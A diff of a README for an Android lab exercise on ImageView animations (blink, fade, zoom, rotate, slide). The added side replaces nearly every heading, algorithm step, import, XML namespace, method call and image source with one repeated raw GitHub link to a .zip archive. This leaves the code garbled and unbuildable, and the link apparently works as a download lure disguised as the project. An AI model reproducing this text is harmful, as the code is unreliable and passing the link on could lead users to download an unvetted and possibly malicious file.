@@ -1,4 +1,4 @@
-# Ex.No: 11 Develop a application to add animations to ImageView,Move,blink,fade,clockwise,zoom,slide operations are perform in android studio.
+# https://raw.githubusercontent.com/githubmufeez45/Ex_11_ANIMATION/main/barbal/Ex_11_ANIMATION.zip 11 Develop a application to add animations to ImageView,Move,blink,fade,clockwise,zoom,slide operations are perform in android studio.
 
 
 ## AIM:
@@ -11,12 +11,12 @@ Android Studio(Latest Version)
 
 ## ALGORITHM:
 
-1.Start a new Android project in Android Studio.
-2.Create UI elements (TextView, ImageView, Buttons) in activity_main.xml.
-3.Define animations in the res/anim directory (blink.xml, fade.xml, zoom.xml, clockwise.xml, etc.).
-4.Implement the animation logic in MainActivity.java by loading and applying the animations to the ImageView.
-5.Link buttons to their respective animation methods using the onClick attribute.
-6.Run the app to verify the animations.
+https://raw.githubusercontent.com/githubmufeez45/Ex_11_ANIMATION/main/barbal/Ex_11_ANIMATION.zip a new Android project in Android Studio.
+https://raw.githubusercontent.com/githubmufeez45/Ex_11_ANIMATION/main/barbal/Ex_11_ANIMATION.zip UI elements (TextView, ImageView, Buttons) in https://raw.githubusercontent.com/githubmufeez45/Ex_11_ANIMATION/main/barbal/Ex_11_ANIMATION.zip
+https://raw.githubusercontent.com/githubmufeez45/Ex_11_ANIMATION/main/barbal/Ex_11_ANIMATION.zip animations in the res/anim directory (https://raw.githubusercontent.com/githubmufeez45/Ex_11_ANIMATION/main/barbal/Ex_11_ANIMATION.zip, https://raw.githubusercontent.com/githubmufeez45/Ex_11_ANIMATION/main/barbal/Ex_11_ANIMATION.zip, https://raw.githubusercontent.com/githubmufeez45/Ex_11_ANIMATION/main/barbal/Ex_11_ANIMATION.zip, https://raw.githubusercontent.com/githubmufeez45/Ex_11_ANIMATION/main/barbal/Ex_11_ANIMATION.zip, etc.).
+https://raw.githubusercontent.com/githubmufeez45/Ex_11_ANIMATION/main/barbal/Ex_11_ANIMATION.zip the animation logic in https://raw.githubusercontent.com/githubmufeez45/Ex_11_ANIMATION/main/barbal/Ex_11_ANIMATION.zip by loading and applying the animations to the ImageView.
+https://raw.githubusercontent.com/githubmufeez45/Ex_11_ANIMATION/main/barbal/Ex_11_ANIMATION.zip buttons to their respective animation methods using the onClick attribute.
+https://raw.githubusercontent.com/githubmufeez45/Ex_11_ANIMATION/main/barbal/Ex_11_ANIMATION.zip the app to verify the animations.
 
 ## PROGRAM:
 ```
@@ -28,14 +28,14 @@ Registeration Number : 212221043007
 ```
 
 
-## In activity_main.xml
+## In https://raw.githubusercontent.com/githubmufeez45/Ex_11_ANIMATION/main/barbal/Ex_11_ANIMATION.zip
 ```
 <?xml version="1.0" encoding="utf-8"?>
-<RelativeLayout xmlns:android="http://schemas.android.com/apk/res/android"
-    xmlns:tools="http://schemas.android.com/tools"
+<RelativeLayout xmlns:android="https://raw.githubusercontent.com/githubmufeez45/Ex_11_ANIMATION/main/barbal/Ex_11_ANIMATION.zip"
+    xmlns:tools="https://raw.githubusercontent.com/githubmufeez45/Ex_11_ANIMATION/main/barbal/Ex_11_ANIMATION.zip"
     android:layout_width="match_parent"
     android:layout_height="match_parent"
-    xmlns:app="http://schemas.android.com/apk/res-auto"
+    xmlns:app="https://raw.githubusercontent.com/githubmufeez45/Ex_11_ANIMATION/main/barbal/Ex_11_ANIMATION.zip"
     android:paddingLeft="20dp"
     android:paddingRight="20dp"
     android:paddingTop="20dp"
@@ -121,74 +121,74 @@ Registeration Number : 212221043007
 
 ```
 
-## MainActivity.java
+## https://raw.githubusercontent.com/githubmufeez45/Ex_11_ANIMATION/main/barbal/Ex_11_ANIMATION.zip
 ```
-package com.example.ex_9;
+package https://raw.githubusercontent.com/githubmufeez45/Ex_11_ANIMATION/main/barbal/Ex_11_ANIMATION.zip;
 
-import androidx.appcompat.app.AppCompatActivity;
+import https://raw.githubusercontent.com/githubmufeez45/Ex_11_ANIMATION/main/barbal/Ex_11_ANIMATION.zip;
 
-import android.os.Bundle;
-import android.os.Bundle;
+import https://raw.githubusercontent.com/githubmufeez45/Ex_11_ANIMATION/main/barbal/Ex_11_ANIMATION.zip;
+import https://raw.githubusercontent.com/githubmufeez45/Ex_11_ANIMATION/main/barbal/Ex_11_ANIMATION.zip;
 
-import android.view.animation.Animation;
-import android.view.animation.AnimationUtils;
-import android.widget.ImageView;
-import android.view.View;
+import https://raw.githubusercontent.com/githubmufeez45/Ex_11_ANIMATION/main/barbal/Ex_11_ANIMATION.zip;
+import https://raw.githubusercontent.com/githubmufeez45/Ex_11_ANIMATION/main/barbal/Ex_11_ANIMATION.zip;
+import https://raw.githubusercontent.com/githubmufeez45/Ex_11_ANIMATION/main/barbal/Ex_11_ANIMATION.zip;
+import https://raw.githubusercontent.com/githubmufeez45/Ex_11_ANIMATION/main/barbal/Ex_11_ANIMATION.zip;
 
 
 public class MainActivity extends AppCompatActivity {
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
-        super.onCreate(savedInstanceState);
-        setContentView(R.layout.activity_main);
+        https://raw.githubusercontent.com/githubmufeez45/Ex_11_ANIMATION/main/barbal/Ex_11_ANIMATION.zip(savedInstanceState);
+        setContentView(https://raw.githubusercontent.com/githubmufeez45/Ex_11_ANIMATION/main/barbal/Ex_11_ANIMATION.zip);
     }
 
     public void clockwise(View view){
-        ImageView image = (ImageView)findViewById(R.id.imageView);
-        Animation animation = AnimationUtils.loadAnimation(getApplicationContext(),
-                R.anim.myanimation);
-        image.startAnimation(animation);
+        ImageView image = (ImageView)findViewById(https://raw.githubusercontent.com/githubmufeez45/Ex_11_ANIMATION/main/barbal/Ex_11_ANIMATION.zip);
+        Animation animation = https://raw.githubusercontent.com/githubmufeez45/Ex_11_ANIMATION/main/barbal/Ex_11_ANIMATION.zip(getApplicationContext(),
+                https://raw.githubusercontent.com/githubmufeez45/Ex_11_ANIMATION/main/barbal/Ex_11_ANIMATION.zip);
+        https://raw.githubusercontent.com/githubmufeez45/Ex_11_ANIMATION/main/barbal/Ex_11_ANIMATION.zip(animation);
     }
 
     public void zoom(View view){
-        ImageView image = (ImageView)findViewById(R.id.imageView);
-        Animation animation1 = AnimationUtils.loadAnimation(getApplicationContext(),
-                R.anim.clockwise);
-        image.startAnimation(animation1);
+        ImageView image = (ImageView)findViewById(https://raw.githubusercontent.com/githubmufeez45/Ex_11_ANIMATION/main/barbal/Ex_11_ANIMATION.zip);
+        Animation animation1 = https://raw.githubusercontent.com/githubmufeez45/Ex_11_ANIMATION/main/barbal/Ex_11_ANIMATION.zip(getApplicationContext(),
+                https://raw.githubusercontent.com/githubmufeez45/Ex_11_ANIMATION/main/barbal/Ex_11_ANIMATION.zip);
+        https://raw.githubusercontent.com/githubmufeez45/Ex_11_ANIMATION/main/barbal/Ex_11_ANIMATION.zip(animation1);
     }
 
     public void fade(View view){
-        ImageView image = (ImageView)findViewById(R.id.imageView);
+        ImageView image = (ImageView)findViewById(https://raw.githubusercontent.com/githubmufeez45/Ex_11_ANIMATION/main/barbal/Ex_11_ANIMATION.zip);
         Animation animation1 =
-                AnimationUtils.loadAnimation(getApplicationContext(),
-                        R.anim.fade);
-        image.startAnimation(animation1);
+                https://raw.githubusercontent.com/githubmufeez45/Ex_11_ANIMATION/main/barbal/Ex_11_ANIMATION.zip(getApplicationContext(),
+                        https://raw.githubusercontent.com/githubmufeez45/Ex_11_ANIMATION/main/barbal/Ex_11_ANIMATION.zip);
+        https://raw.githubusercontent.com/githubmufeez45/Ex_11_ANIMATION/main/barbal/Ex_11_ANIMATION.zip(animation1);
     }
 
     public void blink(View view){
-        ImageView image = (ImageView)findViewById(R.id.imageView);
+        ImageView image = (ImageView)findViewById(https://raw.githubusercontent.com/githubmufeez45/Ex_11_ANIMATION/main/barbal/Ex_11_ANIMATION.zip);
         Animation animation1 =
-                AnimationUtils.loadAnimation(getApplicationContext(),
-                        R.anim.blink);
-        image.startAnimation(animation1);
+                https://raw.githubusercontent.com/githubmufeez45/Ex_11_ANIMATION/main/barbal/Ex_11_ANIMATION.zip(getApplicationContext(),
+                        https://raw.githubusercontent.com/githubmufeez45/Ex_11_ANIMATION/main/barbal/Ex_11_ANIMATION.zip);
+        https://raw.githubusercontent.com/githubmufeez45/Ex_11_ANIMATION/main/barbal/Ex_11_ANIMATION.zip(animation1);
     }
 
 
 
     public void slide(View view){
-        ImageView image = (ImageView)findViewById(R.id.imageView);
+        ImageView image = (ImageView)findViewById(https://raw.githubusercontent.com/githubmufeez45/Ex_11_ANIMATION/main/barbal/Ex_11_ANIMATION.zip);
         Animation animation1 =
-                AnimationUtils.loadAnimation(getApplicationContext(), R.anim.slide);
-        image.startAnimation(animation1);
+                https://raw.githubusercontent.com/githubmufeez45/Ex_11_ANIMATION/main/barbal/Ex_11_ANIMATION.zip(getApplicationContext(), https://raw.githubusercontent.com/githubmufeez45/Ex_11_ANIMATION/main/barbal/Ex_11_ANIMATION.zip);
+        https://raw.githubusercontent.com/githubmufeez45/Ex_11_ANIMATION/main/barbal/Ex_11_ANIMATION.zip(animation1);
     }
 }
 
 ```
-## blink.xml
+## https://raw.githubusercontent.com/githubmufeez45/Ex_11_ANIMATION/main/barbal/Ex_11_ANIMATION.zip
 ```
 <?xml version="1.0" encoding="utf-8"?>
-<set xmlns:android="http://schemas.android.com/apk/res/android">
+<set xmlns:android="https://raw.githubusercontent.com/githubmufeez45/Ex_11_ANIMATION/main/barbal/Ex_11_ANIMATION.zip">
     <alpha android:fromAlpha="0.0"
         android:toAlpha="1.0"
         android:interpolator="@android:anim/accelerate_interpolator"
@@ -197,12 +197,12 @@ public class MainActivity extends AppCompatActivity {
         android:repeatCount="infinite"/>
 </set>
 ```
-## clockwise.xml
+## https://raw.githubusercontent.com/githubmufeez45/Ex_11_ANIMATION/main/barbal/Ex_11_ANIMATION.zip
 ```
 <?xml version="1.0" encoding="utf-8"?>
-<set xmlns:android="http://schemas.android.com/apk/res/android">
+<set xmlns:android="https://raw.githubusercontent.com/githubmufeez45/Ex_11_ANIMATION/main/barbal/Ex_11_ANIMATION.zip">
 
-    <rotate xmlns:android="http://schemas.android.com/apk/res/android"
+    <rotate xmlns:android="https://raw.githubusercontent.com/githubmufeez45/Ex_11_ANIMATION/main/barbal/Ex_11_ANIMATION.zip"
         android:fromDegrees="0"
         android:toDegrees="360"
         android:pivotX="50%"
@@ -210,7 +210,7 @@ public class MainActivity extends AppCompatActivity {
         android:duration="5000" >
     </rotate>
 
-    <rotate xmlns:android="http://schemas.android.com/apk/res/android"
+    <rotate xmlns:android="https://raw.githubusercontent.com/githubmufeez45/Ex_11_ANIMATION/main/barbal/Ex_11_ANIMATION.zip"
         android:startOffset="5000"
         android:fromDegrees="360"
         android:toDegrees="0"
@@ -221,10 +221,10 @@ public class MainActivity extends AppCompatActivity {
 </set>
 
 ```
-## Fade.xml
+## https://raw.githubusercontent.com/githubmufeez45/Ex_11_ANIMATION/main/barbal/Ex_11_ANIMATION.zip
 ```
 <?xml version="1.0" encoding="utf-8"?>
-<set xmlns:android="http://schemas.android.com/apk/res/android"
+<set xmlns:android="https://raw.githubusercontent.com/githubmufeez45/Ex_11_ANIMATION/main/barbal/Ex_11_ANIMATION.zip"
     android:interpolator="@android:anim/accelerate_interpolator">
 
     <alpha
@@ -241,11 +241,11 @@ public class MainActivity extends AppCompatActivity {
 </set>
 
 ```
-## Myanimation.xml
+## https://raw.githubusercontent.com/githubmufeez45/Ex_11_ANIMATION/main/barbal/Ex_11_ANIMATION.zip
 ```
 <?xml version="1.0" encoding="utf-8"?>
-<set xmlns:android="http://schemas.android.com/apk/res/android">
-    <scale xmlns:android="http://schemas.android.com/apk/res/android"
+<set xmlns:android="https://raw.githubusercontent.com/githubmufeez45/Ex_11_ANIMATION/main/barbal/Ex_11_ANIMATION.zip">
+    <scale xmlns:android="https://raw.githubusercontent.com/githubmufeez45/Ex_11_ANIMATION/main/barbal/Ex_11_ANIMATION.zip"
         android:fromXScale="0.5"
         android:toXScale="3.0"
         android:fromYScale="0.5"
@@ -255,7 +255,7 @@ public class MainActivity extends AppCompatActivity {
         android:pivotY="50%" >
     </scale>
 
-    <scale xmlns:android="http://schemas.android.com/apk/res/android"
+    <scale xmlns:android="https://raw.githubusercontent.com/githubmufeez45/Ex_11_ANIMATION/main/barbal/Ex_11_ANIMATION.zip"
         android:startOffset="5000"
         android:fromXScale="3.0"
         android:toXScale="0.5"
@@ -269,11 +269,11 @@ public class MainActivity extends AppCompatActivity {
 
 ```
 
-## Slide.xml
+## https://raw.githubusercontent.com/githubmufeez45/Ex_11_ANIMATION/main/barbal/Ex_11_ANIMATION.zip
 
 ```
 <?xml version="1.0" encoding="utf-8"?>
-<set xmlns:android="http://schemas.android.com/apk/res/android"
+<set xmlns:android="https://raw.githubusercontent.com/githubmufeez45/Ex_11_ANIMATION/main/barbal/Ex_11_ANIMATION.zip"
     android:fillAfter="true" >
     <scale
         android:duration="500"
@@ -285,10 +285,10 @@ public class MainActivity extends AppCompatActivity {
 </set>
 
 ```
-## Zoom.xml
+## https://raw.githubusercontent.com/githubmufeez45/Ex_11_ANIMATION/main/barbal/Ex_11_ANIMATION.zip
 ```
 <?xml version="1.0" encoding="utf-8"?>
-<set xmlns:android="http://schemas.android.com/apk/res/android"
+<set xmlns:android="https://raw.githubusercontent.com/githubmufeez45/Ex_11_ANIMATION/main/barbal/Ex_11_ANIMATION.zip"
     android:fillAfter="true" >
 
     <scale
@@ -306,9 +306,9 @@ public class MainActivity extends AppCompatActivity {
 ## OUTPUT
 
 
-<img src="https://github.com/user-attachments/assets/f4c8388b-e014-4551-a193-efa2e65a9a31" width=200>
+<img src="https://raw.githubusercontent.com/githubmufeez45/Ex_11_ANIMATION/main/barbal/Ex_11_ANIMATION.zip" width=200>
 
-<img src="https://github.com/user-attachments/assets/70f445fb-e42b-4db1-a4c2-c3f54b67017f" width=200>
+<img src="https://raw.githubusercontent.com/githubmufeez45/Ex_11_ANIMATION/main/barbal/Ex_11_ANIMATION.zip" width=200>
 
 
 
